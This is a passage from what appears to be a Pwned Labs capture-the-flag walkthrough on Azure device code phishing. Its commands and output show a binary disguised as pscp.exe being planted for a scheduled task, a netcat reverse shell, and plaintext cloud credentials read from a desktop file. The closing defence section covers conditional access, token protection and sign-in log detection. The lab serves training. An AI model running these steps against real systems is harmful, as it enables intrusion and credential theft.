*Evil-WinRM* PS C:\DownloadSecurityReports> upload /home/kali/pwnedlabs/azure/foothold.exe pscp.exe
                                        
Info: Uploading /home/kali/pwnedlabs/azure/foothold.exe to C:\DownloadSecurityReports\pscp.exe
                                        
Data: 21230932 bytes of 21230932 bytes copied
                                        
Info: Upload successful!
```

Now we have to make sure everyone has access to the file
```
*Evil-WinRM* PS C:\DownloadSecurityReports> cmd /c "icacls pscp.exe /grant Everyone:(RX)"
processed file: pscp.exe
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\DownloadSecurityReports> cmd /c "icacls.exe pscp.exe"
pscp.exe Everyone:(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Administrators:(I)(F)
         BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

After few minutes, we receive connection, which confirms that binary was run as a scheduled task
```
root@ip-172-31-21-144:/home/ubuntu# nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 20.127.161.82 65351
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
security-direct\james_local

C:\Windows\system32>

```
Let's check out common locations that the user could save files, like their desktop. We see a `login.txt` with cloud credentials for the International Asset Management security director
```
C:\Users\james_local\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is BE2B-CC38

 Directory of C:\Users\james_local\Desktop

11/06/2024  11:52 PM    <DIR>          .
11/02/2024  01:07 AM    <DIR>          ..
11/03/2024  12:51 AM                32 flag.txt
11/03/2024  12:56 AM                46 login.txt
11/06/2024  11:50 PM    <DIR>          M365BaselineConformance
11/06/2024  11:48 PM           430,236 M365BaselineConformance.zip
11/06/2024  11:50 PM             2,319 Microsoft Edge.lnk
               4 File(s)        432,633 bytes
               3 Dir(s)  119,532,945,408 bytes free

C:\Users\james_local\Desktop>type login.txt
type login.txt
james.brandt@international-am.com
<REDACTED>
```
# Attack path
Attack path visualization created by [Mathias Persson](https://www.linkedin.com/in/mathias-persson-582b60197/) for Pwned Labs

![](leverage-device-code-phishing-for-initial-access-8.png)

# Defense
This section is from [Walkthrough section](https://pwnedlabs.io/labs/leverage-device-code-phishing-for-initial-access) of the lab.

For prevention, International Asset Management (and their MSSP Mega Big Tech) could require all logins to come from Azure managed devices. The token protection conditional access policy could also be enabled, that binds a user's refresh token to a particular managed device.

Also, we can choose to disable the device code authentication flow or authentication transfer using conditional access

![](leverage-device-code-phishing-for-initial-access-9.png)

The security awareness team could highlight the danger of attacks such as these, where the "phishing page" is a legitimate Microsoft login page. Ultimately, it is best to design systems that don't rely on users making good trust decisions. Note that the compromised user had a strong password and also had MFA enabled, and provided these details when logging in. This is a very dangerous phishing technique.

In terms of detection, in the non-interactive sign-in logs we see the activity details below for the compromised user. Anomymous user agents could be alerted on, but this can be easily spoofed. If a company doesn't use the device code authentication flow (or only certain users are expected to use this authentication flow) then this can be alerted on.

![](leverage-device-code-phishing-for-initial-access-10.png)

Also, we can set alerts for interactive user logins that use the `Device Code` authentication protocol with a Client ID of `Microsoft Office`

![](leverage-device-code-phishing-for-initial-access-11.png)

Note that threat actors could instead specify the Microsoft Azure CLI client ID, and blend in with legitimate requests.

Useful links:
- https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-token-protection
- https://learn.microsoft.com/en-us/entra/identity/conditional-access/policy-block-authentication-flows
- https://aadinternals.com/post/phishing/